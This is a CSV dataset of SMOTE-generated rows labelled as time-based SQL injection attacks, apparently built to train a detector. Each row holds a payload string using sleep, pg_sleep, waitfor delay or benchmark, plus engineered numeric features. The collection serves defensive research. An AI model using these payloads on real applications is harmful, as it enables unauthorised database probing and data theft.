id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000418,attack,time,1'   )    )    as kahn where 1361  =  1361 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000062,0.32082765657901363,118.8493127223145,27.150687277685506,3.268141283260525,38.0,10.0,57.0,13.849312722314494,0.31973551606267264,0.0841409252796507,0.479603274094009,0.1165202845636677,0.8493127223144931,-1.1102230246251565e-16,5.551115123125783e-17,0.0,1.0,1.0,8.673617379884035e-19,10.0,0.0,0.0,0.0,2.0,0.8493127223144931,0.0,2.7755575615628914e-17,1.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,2.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000419,attack,time,"1"" where 2677  =  2677 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --",nearest_attack_euclidean,R000345,0.13274671783824968,102.07125064788764,28.0,3.44707899077644,33.0,10.0,45.85700051831011,13.214250129577525,0.3234306677208769,0.09800929324875059,0.44912673016947297,0.1294333088608996,0.0,1.0,2.0,0.0,1.0,1.0,8.673617379884035e-19,8.214250129577525,0.0,0.0,0.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,2.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000420,attack,time,1'  )   or sleep  (  5  )   and   (  'fizk'  =  'fizk,nearest_attack_euclidean,R000786,1.1776565186411445,53.44228453501097,19.11543092997806,3.2198059724852306,18.44228453501097,2.0,24.0,9.0,0.34503143211928156,0.03742677530746963,0.4491213036896355,0.1684204888836133,4.0,-1.1102230246251565e-16,5.551115123125783e-17,0.0,-2.7755575615628914e-17,1.0,8.673617379884035e-19,4.0,0.0,0.0,0.0,1.0,1.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.442284535010969,0.5577154649890309,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000421,attack,time,1'  )   as jxtg where 1071  =  1071 and sleep  (  5  )  --,nearest_attack_euclidean,R001119,0.5763634947631905,53.65802383600986,22.330009167696097,3.536237608743138,16.996011001235317,10.0,19.996011001235317,6.6660018335392195,0.3146613736350426,0.1890497171034105,0.37137628876606577,0.12491262049548113,1.0,-1.1102230246251565e-16,2.0,0.0,-2.7755575615628914e-17,1.0,8.673617379884035e-19,2.66600183353922,0.0,0.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000422,attack,time,1 where 9393  =  9393 waitfor delay '0:0:5'--,nearest_attack_euclidean,R001138,0.08866979343828524,45.037137987047565,22.03713798704756,4.088855490034541,17.0,12.0,9.0,7.037137987047563,0.3774727798165176,0.26645137398813007,0.19983853049109757,0.15623731570425478,2.0,0.037137987047562326,2.0,0.0,-2.7755575615628914e-17,1.0,8.673617379884035e-19,0.0,0.0,0.0,0.0,3.0,1.0,0.03713798704756244,1.0,0.0,0.0,1.0,0.0,8.673617379884035e-19,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000423,attack,time,1'  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  'mqoj' like 'mqoj,nearest_attack_euclidean,R000946,0.2579934975167521,110.04504816502967,24.88063102062871,3.3440222176133214,43.23873795874258,2.0,50.04504816502967,14.761262041257417,0.3932968461754702,0.018185069856550412,0.45444790430348814,0.13407017966449125,4.0,-1.1102230246251565e-16,5.551115123125783e-17,0.0,1.0,0.0,8.673617379884035e-19,9.761262041257417,0.0,0.0,0.0,1.0,1.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.8806310206287082,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.880631020628709
SMOTE_000424,attack,time,"1%'   )    )     )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (     (  '%'  =  '",nearest_attack_euclidean,R001167,0.9975462473595655,118.5872522267818,27.529084075593932,3.25542275628389,20.11633630237573,22.0,58.0,18.470915924406068,0.1690668339445409,0.18560770280111183,0.4893293982938403,0.15599606496050697,4.0,-1.1102230246251565e-16,5.551115123125783e-17,0.0,-2.7755575615628914e-17,2.0,8.673617379884035e-19,10.0,1.4709159244060672,0.0,1.0,2.0,1.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0000000000000002,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000425,attack,time,1   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000854,0.28326886388579986,87.50987868388914,18.0,2.7590168759429243,27.0,2.0,46.865610300476405,11.644268383412735,0.30900043849196696,0.022888921369775342,0.5350630350110186,0.13304760512723915,0.0,-1.1102230246251565e-16,5.551115123125783e-17,0.0,1.0,0.0,8.673617379884035e-19,9.644268383412733,0.0,0.0,0.0,1.0,0.0,0.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000426,attack,time,1'   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   'zjun'  =  'zjun,nearest_attack_euclidean,R000853,0.09419268703876349,108.77108376454512,28.92289162354549,3.3495564963837814,30.0,10.0,53.6168670116361,15.154216752909026,0.27596260884052465,0.09198753628017488,0.49276162882421587,0.1392882260550846,4.0,-1.1102230246251565e-16,5.551115123125783e-17,0.0,-2.7755575615628914e-17,2.0,8.673617379884035e-19,8.154216752909026,0.0,1.0,0.0,2.0,1.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000427,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   'cbaj'  =  'cbaj,nearest_attack_euclidean,R000611,0.3045976408044484,101.28753894775845,22.61250556396549,3.1155771305912596,36.0,1.0,49.675033383792965,14.612505563965493,0.3558335247700928,0.009884264576947036,0.49001302999911067,0.14426918065384955,3.0,-1.1102230246251565e-16,5.551115123125783e-17,0.0,1.0,1.0,8.673617379884035e-19,9.612505563965493,0.0,0.0,0.0,2.0,1.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000428,attack,time,"1"" waitfor delay '0:0:5' and ""dvfr"" like ""dvfr",nearest_attack_euclidean,R000154,0.9569861956512917,44.737611333418215,21.315597166645446,4.138448427044086,25.737611333418215,3.6844028333545538,7.315597166645446,8.0,0.5745417263638437,0.08205594461730673,0.16426200327731005,0.17914032574153949,2.0,3.684402833354553,5.551115123125783e-17,0.0,-2.7755575615628914e-17,0.3155971666454467,8.673617379884035e-19,0.0,0.0,0.0,0.0,0.3155971666454467,1.0,1.0,2.7755575615628914e-17,0.0,0.0,0.3155971666454467,0.0,8.673617379884035e-19,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000429,attack,time,1'  )   as jztg where 1222  =  1222 or sleep  (  5  )  #,nearest_attack_euclidean,R000571,0.24533074647011546,55.88639785218447,22.0,3.45124227483556,18.0,10.0,22.0,5.88639785218447,0.32209248008463626,0.1789402667136868,0.3936685867701109,0.10529866643156607,0.8863978521844709,-1.1102230246251565e-16,5.551115123125783e-17,0.0,-2.7755575615628914e-17,1.0,8.673617379884035e-19,3.0,0.0,0.0,0.0,1.0,0.8863978521844706,0.0,2.7755575615628914e-17,1.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000430,attack,time,"1""   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  ""djwo""  =  ""djwo",nearest_attack_euclidean,R000250,0.2640400845614478,133.34739309856923,25.0,2.904142788908062,38.34739309856923,2.0,73.0,20.0,0.2875388292992081,0.0149991825410693,0.5474701627490296,0.14999182541069303,0.0,3.9999999999999996,5.551115123125783e-17,0.0,1.0,1.0,8.673617379884035e-19,14.0,0.0,0.0,0.0,2.0,0.0,1.0,2.7755575615628914e-17,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.8842023004769244,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.884202300476924
SMOTE_000431,attack,time,"select pg_sleep  (  5  )   and   (  ""tpry""  =  ""tpry",nearest_attack_euclidean,R001080,0.9170332441761951,47.47948441732818,18.62329036811068,3.436252089997591,20.986322944885455,1.0,17.493161472442726,8.0,0.43835633034527277,0.021404094030130688,0.3690068233835511,0.17123275224104548,0.0,3.0,5.551115123125783e-17,0.0,-2.7755575615628914e-17,1.0,8.673617379884035e-19,2.623290368110682,0.37670963188931833,1.0,0.0,1.0,0.0,1.0,2.7755575615628914e-17,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000432,attack,time,1' and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000886,0.46139497830966275,80.51537642865843,22.515376428658428,3.1122803492553692,28.515376428658428,2.0,39.0,11.0,0.35408530095887775,0.024842873040043165,0.48443602428084165,0.1366358017202374,1.0,-1.1102230246251565e-16,5.551115123125783e-17,0.0,1.0,0.0,8.673617379884035e-19,8.0,0.0,0.0,0.0,1.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.7423117856707868,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.742311785670787
SMOTE_000433,attack,time,1   )    )    or sleep  (  5  )   and    (    (   8285  =  8285,nearest_attack_euclidean,R000185,0.045263388916575865,62.65335918473471,16.975239941766766,2.612085782846538,10.0,10.0,35.70287930120118,6.95047988353353,0.15985306386545284,0.15985306386545284,0.569407342185042,0.11088653008405228,0.0,-1.1102230246251565e-16,5.551115123125783e-17,0.0,-2.7755575615628914e-17,1.0,8.673617379884035e-19,5.95047988353353,0.0,0.0,0.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000434,attack,time,"1"" where 1831  =  1831 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000329,0.4677994167602633,100.52430724501525,27.524307245015258,3.3976542918133665,33.52430724501526,10.0,45.0,12.0,0.3334439789623551,0.09948597328920072,0.44768687980140326,0.11938316794704087,0.0,1.0,5.551115123125783e-17,0.0,1.0,1.0,8.673617379884035e-19,8.0,0.0,0.0,0.0,2.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,2.0,0.0,1.0,1.0,0.7378463774923717,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.737846377492372
SMOTE_000435,attack,time,1'  )   waitfor delay '0:0:5',nearest_attack_euclidean,R000648,0.3873037007512707,28.735993084460155,18.0,3.8252851288677303,12.0,3.735993084460153,6.735993084460155,6.264006915539847,0.41769468348088445,0.12980274274815742,0.23422641361837856,0.2182761601525796,3.0,-1.1102230246251565e-16,5.551115123125783e-17,0.0,-2.7755575615628914e-17,0.0,8.673617379884035e-19,1.0,0.0,0.0,0.0,0.264006915539847,1.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000436,attack,time,"1' where 7464  =  7464 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000442,0.41149667354110514,93.64388643798904,28.464388643798905,3.8953725260263696,22.393165931396712,29.0,32.786331862793425,9.464388643798905,0.2386836566020552,0.3119603436035788,0.34828027447159504,0.10107572532277097,1.0,-1.1102230246251565e-16,5.551115123125783e-17,0.0,-2.7755575615628914e-17,2.0,8.673617379884035e-19,4.464388643798904,0.0,0.0,1.0,2.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,1.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0000000000000002,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000437,attack,time,"1%""   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000933,0.14796456127518598,93.31929091224069,22.920177271939828,2.925173765166166,28.0,2.0,49.31929091224068,14.0,0.30008423173232024,0.021434587980880007,0.5284390644206396,0.15004211586616012,0.0,1.0,5.551115123125783e-17,0.0,1.0,0.0,8.673617379884035e-19,10.079822728060172,0.9201772719398287,0.0,0.0,1.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000438,attack,time,1   )    )    as pynj where 7683  =  7683 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000831,0.009330883791019257,65.00934590005038,28.97196229984885,4.086733276463493,23.0,12.0,21.0,9.009345900050384,0.35379604762210753,0.1845892422376213,0.3230311739158373,0.13858353622443392,2.0093459000503833,-1.1102230246251565e-16,2.0,0.0,-2.7755575615628914e-17,1.0,8.673617379884035e-19,2.0000000000000004,0.0,0.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000439,attack,time,1'   )    )    as kahn where 1361  =  1361 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000062,0.2043521689447075,118.91685294128003,27.166294117439953,3.2913241389805474,38.33258823487991,10.0,56.41797058896016,14.166294117439953,0.3223712852999621,0.08409282656225608,0.4743966587689288,0.11913922936885303,1.166294117439954,-1.1102230246251565e-16,5.551115123125783e-17,0.0,1.0,1.0,8.673617379884035e-19,9.916852941280023,0.0,0.0,0.0,2.0831470587199767,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,2.0831470587199767,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.083147058719977
SMOTE_000440,attack,time,"select sleep  (  5  )   and ""%""  =  """,nearest_attack_euclidean,R000116,0.00433121458497886,37.022341266139435,16.0,3.172079783174463,14.0,1.0,15.01787301291155,7.004468253227888,0.37817710571045554,0.027012650407889693,0.40561530404481067,0.18919493983684413,0.0,3.0,5.551115123125783e-17,0.0,-2.7755575615628914e-17,1.0,8.673617379884035e-19,2.0044682532278877,1.0,0.0,0.0,1.0,0.0,1.0,2.7755575615628914e-17,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000441,attack,time,"make_set  (  8734  =  8734,sleep  (  5   )    )   ",nearest_attack_euclidean,R001074,1.0999054217799684,50.44652801481469,18.10694397037062,3.132815117900411,11.55347198518531,9.44652801481469,22.893056029629378,6.553471985185309,0.2291432404241134,0.18717947004211855,0.453658503982567,0.13001878555120105,0.0,-1.1102230246251565e-16,5.551115123125783e-17,0.0,-2.7755575615628914e-17,1.0,8.673617379884035e-19,4.0,0.0,0.5534719851853096,1.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.4465280148146904,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.4465280148146904
SMOTE_000442,attack,time,1'  )   where 4364  =  4364 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000492,0.05822712589793179,91.72708743272793,30.09694499103039,3.7015162691575885,25.290834973091172,18.0,37.38777996412156,11.048472495515195,0.27558457357797,0.1964454101400474,0.4074627557250807,0.12050726055690189,1.0,-1.1102230246251565e-16,2.0,0.0,-2.7755575615628914e-17,2.0,8.673617379884035e-19,5.048472495515195,0.0,1.0,0.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000443,attack,time,1'+  (  select 'sfko' where 6853  =  6853 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000338,0.4877776544117504,65.87747876460334,24.707507078465554,3.7858608187944935,24.707507078465554,10.0,21.87747876460334,9.292492921534446,0.3757423599101143,0.15194479140931022,0.3314429177990351,0.1408699308815404,3.146246460767223,-1.1102230246251565e-16,5.551115123125783e-17,0.0,-2.7755575615628914e-17,1.0,8.673617379884035e-19,3.1462464607672236,0.0,0.0,0.0,2.1462464607672236,1.0,0.0,2.7755575615628914e-17,0.8537535392327764,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.14624646076722347,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.1462464607672236
SMOTE_000444,attack,time,"1""  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000226,0.17952413587519306,70.56842681331041,25.928071135551733,3.5189533867358747,20.0,10.0,30.712284542206937,9.856142271103469,0.28356044717958656,0.14178022358979328,0.43509230147000433,0.13956702776061586,0.0,0.9280711355517344,2.0,0.0,-2.7755575615628914e-17,1.0,8.673617379884035e-19,4.928071135551734,0.0,1.0,0.0,3.0,0.0,0.9280711355517344,1.0,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000445,attack,time,"1'   )    )    as agdn where 8442  =  8442 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",nearest_attack_euclidean,R000703,0.4629888706933238,104.63531276198898,29.284708368265196,3.8010766531483005,23.85412510479559,30.0,39.138833473060785,11.642354184132598,0.22712302676706234,0.28812828872156276,0.373262061821354,0.11148662269002087,1.0,-1.1102230246251565e-16,2.0,0.0,-2.7755575615628914e-17,2.0,8.673617379884035e-19,5.642354184132598,0.0,0.0,1.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,1.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0000000000000002,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000446,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,0.17001646291179293,26.27150550857013,17.0,3.920434925228414,12.817876377142532,3.8178763771425324,2.8178763771425324,6.817876377142532,0.4888133503565808,0.14492212584310443,0.10671198978605151,0.25955253401426326,2.8178763771425324,-1.1102230246251565e-16,2.0,0.0,-2.7755575615628914e-17,0.0,8.673617379884035e-19,0.0,0.0,0.0,0.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,8.673617379884035e-19,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000447,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  'qfsu'  =  'qfsu",nearest_attack_euclidean,R000269,0.18367906296499484,83.6654676626434,29.0,3.9431978307918416,31.0,15.0,27.932374130114717,9.73309353252868,0.37078977977324334,0.1794144095676984,0.33352253512398417,0.11627327553507408,3.0,-1.1102230246251565e-16,5.551115123125783e-17,0.0,-2.7755575615628914e-17,1.0,8.673617379884035e-19,4.733093532528679,0.0,0.0,1.0,1.0,1.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0000000000000002,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
